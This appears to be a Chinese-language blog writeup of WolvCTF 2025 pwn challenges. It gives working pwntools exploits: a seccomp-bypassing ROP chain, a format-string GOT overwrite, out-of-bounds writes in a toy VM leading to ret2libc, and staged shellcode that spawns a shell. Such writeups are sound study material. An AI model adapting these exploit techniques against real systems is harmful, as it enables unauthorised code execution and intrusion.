---
date: 2025-03-26 10:21:56
layout: post
title: Wolvctf 2025 Writeup
subtitle: 
description: >-
    可以 mark 一下那个 shellcode 题
image: >-
  /assets/img/uploads/cherry-blossom.jpg
optimized_image: >-
  /assets/img/uploads/cherry-blossom.jpg
category: ctf
tags:
  - pwn
  - linux kernel
  - ebpf
author: rosayxy
paginate: true
---

周末打的简单比赛，但是 shellcode 题还是一如既往不会，这里浅浅记一下 writeup    

## dry wall
本地打完需要 leak libc 的版本才发现根本不用 leak，尴尬了     

为啥想到 leak libc 是因为大概率 `ROPgadget` 错 binary 了，导致没有找到 `pop rdi; ret` `pop rsi; ret` 的 gadget     

本地 leak 的思路是 fgets 之后，rsi 指向 stdin->lock，所以可以用 main 里面白给的 printf("%p") 把 rsi 打印出来，从而 leak libc    

但是远程貌似这样做不行 emmmm      

然后也可以用 pwntools 找设置某个寄存器的 gadget，代码如下，之后可以 mark 一下   
```py
rop = ROP("./chal")
log.info(rop.rdi)
```

哦以及是设了 seccomp 可以用 openat + read + write 打 orw    

### exp
```py
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
p = process("./chal")
# p=remote("drywall.kctf-453514-codelab.kctf.cloud",1337)
p.recvuntil("What is your name, epic H4x0r?\n")
# gdb.attach(p,"b* $rebase(0x136f)")
# pause()
rop = ROP("./chal")
log.info(rop.rdi)
p.sendline("~/flag\x00")

p.recvuntil("<|;)\n")
proc_leak = int(p.recvline().strip(),16)
log.info("proc_leak: "+hex(proc_leak))
proc_base = proc_leak - 0x11a3
puts_plt = proc_base + 0x1060
# 目前遇到的问题：没有 pop rdi 的 gadget 有 proc 任意地址写
payload = b"a"*0x110+p64(proc_base + 0x7308)+p64(0x1348+proc_base)+p64(proc_leak)
p.sendline(payload)
libc_leak = int(p.recvline().strip(),16)
log.info("libc_leak: "+hex(libc_leak))
libc_base = libc_leak - 0x1bc8d0
log.info("libc_base: "+hex(libc_base))
p.sendline(b"a"*0x118+p64(proc_leak)) # 因为相当于栈迁移了一次
pop_rdi_ret = proc_base + 0x13db
pop_rsi_ret = proc_base + 0x13d9 # pop rsi r15
flag_addr = proc_base + 0x4050
pop_rax_ret = proc_base + 0x00119B
syscall = 0x119D + proc_base
pop_rdx_ret = 0x01199 + proc_base

ropchain = p64(pop_rdi_ret) + p64(0x100000000-100)+p64(pop_rsi_ret)+p64(flag_addr)+p64(0)+p64(pop_rdx_ret)+p64(0)+p64(pop_rax_ret)+p64(257)+p64(syscall)+p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(flag_addr)+p64(0)+p64(pop_rdx_ret)+p64(0x30)+p64(pop_rax_ret)+p64(0)+p64(syscall)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(flag_addr)+p64(0)+p64(pop_rdx_ret)+p64(0x30)+p64(pop_rax_ret)+p64(1)+p64(syscall)
p.recvuntil("What is your name, epic H4x0r?\n")
p.sendline("flag\x00")
# gdb.attach(p,"b* $rebase(0x1379)")
# pause()
p.recvuntil("<|;)\n")
p.sendline(b"a"*0x118+ropchain)

p.interactive()

```

## take note
给了格式化字符串漏洞，保护是 no relro 所以可以写 got 表，写 `printf` 为 `system` 地址然后让他 "printf" "/bin/sh\x00" 即可得到    
### exp
```py
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
p = process("./chal")
p.recvuntil("How many notes do you need to write?\n")
p.send("10")
def mywrite(idx,content):
    p.recvuntil("3. Exit\n\n")
    p.sendline("1")
    p.recvuntil("Which note do you want to write to? [0 - 9]\n")
    p.sendline(str(idx))
    p.send(content)

def myread(idx):
    p.recvuntil("3. Exit\n\n")
    p.sendline("2")
    p.recvuntil("Which note do you want to print?\n")
    p.sendline(str(idx))

mywrite(0,"%19$p"+"%18$p"+"%23$p"+"\n")

myread(0)
p.recvuntil("Your note reads:\n\n")
leak_line = p.recvline()

leak_addrs = [int(i,16) for i in leak_line.split(b"0x")[1:]]
proc_leak = leak_addrs[0]
stack_leak = leak_addrs[1]
libc_leak = leak_addrs[2]
log.info("proc_leak: "+hex(proc_leak))
log.info("stack_leak: "+hex(stack_leak))
log.info("libc_leak: "+hex(libc_leak))
proc_base = proc_leak - 0x158b
libc_base = libc_leak - 0x24083
log.info("proc_base: "+hex(proc_base))
log.info("libc_base: "+hex(libc_base))

# write to got
# system: 52290 printf 0061C90
# 利用它栈上的 input buffer 可以额外写一些值
printf_got = proc_base + 0x3738
system = libc_base + 0x52290
mywrite(4,"/bin/sh\x00\n")
payload = ("a%"+str(system%0x10000 - 0x31 - 0x81)+"c%14$hn").ljust(0x20,"a")
mywrite(2,payload)
payload2 = ("%"+str((system//0x10000)%0x100)+"c%15$hhn").ljust(0x10,"a")
payload2 = payload2.encode("latin-1") + p64(printf_got) + p64(printf_got+2)
gdb.attach(p,'''
b *$rebase(0x14d8)
''')
pause()
mywrite(1,payload2)

myread(1)
# trigger
myread(4)
p.interactive()
```

## vc1k
一个特别简单的栈上虚拟机（但是不知道为啥好像解数不多），实现的 `load`，`store` bytecode 可以越界读写，思路是用返回地址 `__libc_start_main` 来 leak 然后覆盖返回地址为 `p64(pop_rdi_ret) + p64(libc_binsh_addr) + p64(ret) +p64(system)`    

### exp
```py
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
# 先从栈上 load 出来一个正的 offset 再 leak libc 改返回地址，不难
# p = process("./chal")
p = remote("vc1k.kctf-453514-codelab.kctf.cloud",1337)
def opcode(op,dst,src,imm):
    raw_num = src + dst*8 + imm*64 + op*8192
    return p16(raw_num)

def add(src,dst):
    return opcode(0,dst,src,0)

def neg(src,dst):
    return opcode(1,dst,src,0)

def cjmp(src,dst,imm):
    return opcode(2,dst,src,imm)

def load(src,dst,imm):
    return opcode(4,dst,src,imm)

def store(src,dst,imm):
    return opcode(6,dst,src,imm)
def my_exit():
    return opcode(3,0,0,0)
# start 是 0x60
payload = load(0,1,0x60)
payload += load(1,2,44) + load(1,3,45) + load(1,4,46) + load(0,5,0x63) + add(5,2) + store(1,2,28)+store(1,3,29) + store(1,4,30)
payload += load(0,5,0x66) +add(5,2) + store(1,2,36) + store(1,3,37) + store(1,4,38)
payload += load(0,5,0x61) + load(0,6,0x62) + add(5,2) + add(6,3) + store(1,2,40) + store(1,3,41) + store(1,4,42) + store(1,0,39) + store(1,0,43)
payload += load(0,5,0x64) + load(0,6,0x65) + add(5,2) + add(6,3) + store(1,2,32) + store(1,3,33) + store(1,4,34)+my_exit()
data  = p16(0x7fff) + p16(0xe725) + p16(0x3) + p16(0xfae7) +p16(0x232d) + p16(0x16) + p16(0x1) # todo 这些都需要是 0x7fff 然后把 offset 改大，否则会 sign extend 然后挂掉 到这里时 rdx 不对 checkout 一下

send_data = payload.ljust(0xc0,b'\x00')+data
# gdb.attach(p,'''
# b *$rebase(0x150c)
#            ''')
# pause()
p.send(p16(0x67)+send_data)
p.interactive()

```

## labgrown
shellcode 题，设了以下限制    
```c
void check_shellcode(char* buf, int len){
	unsigned char* uchar_ptr = (unsigned char*) buf;
	int err = 0;
	//check that after len everything else is a nop
	for(int i = len; i < BUF_LEN; i++){
		if(uchar_ptr[i] != (unsigned char)0x90){
			err = 1;
		}
	}
	// check odd even
	for(int i = 0; i < len-1; i++){
		if(((uchar_ptr[i] ^ uchar_ptr[i+1]) & 1) != 1){ // 所有 bytes 奇偶交替
			err = 1;
		}
	}
	// check xor constraint
	for(int i = 0; i < len-1; i++){
		if((uchar_ptr[i] ^ uchar_ptr[i+1]) > (unsigned char)0xC0){
			err = 1;
		}
	}
	for(int i = 0; i < len-2; i++){
		if((uchar_ptr[i] ^ uchar_ptr[i+2]) < (unsigned char) 0x20){
			err = 1;
		}
	}

	if(err){
		puts("You wouldn't cook on one of these... did you learn nothing from my chemistry class?");
		exit(1);
	}
	return;
}
```
这种情况感觉是分段写 shellcode，得先发一个满足 encoding 条件的 read shellcode_part2 assembly 过去    

日常不想打 shellcode 题，试了一下，没搞出来，遂放弃，看了 discord 上的 writeup，用到的这些指令都可以 mark 一下    

此外，找到一个轮子 [SynesthesiaYS](https://github.com/RolfRolles/SynesthesiaYS) 可以自动化求解满足一定 encoding 约束的 shellcode，感觉之后可以试试，虽然感觉可用性可能不太高    

以下 exp credit to ElChals@Discord ，**如有侵权，请通过[邮箱](rosaxinyu@gmail.com)联系我删除**    

### exp

```py
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
p=process("./chal")
shellcode = asm('''
mov  eax, edx 
push rdi
pop rsi
leave
mov dl,0x83
clc
mov ch,0x16                
lea edi,[rax]     
''')

# gdb.attach(p,'''
# b *0x0401440
# ''')
# pause()
# 调用到 shellcode 的时候，rdx 为 0 rsi 为0 rdi 和 rax 相等为我们 shellcode 地址
# 需求：rax rdi 清零，rsi 指向 shellcode 地址加减偏移，rdx 大于等于读入长度

p.recvuntil("your synthetic shell\n")
p.sendline(shellcode)
sleep(0.1)
shellcode_part2 = '''
sub rsp, 0x100
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi
push rsi
push 8
pop rsi
add rsi, rsp
push rsi
mov rsi, rsp
xor edx, edx

push 59
pop rax
syscall
'''
p.sendline(b'\x90' * 0x20 + asm(shellcode_part2))
p.interactive()
```
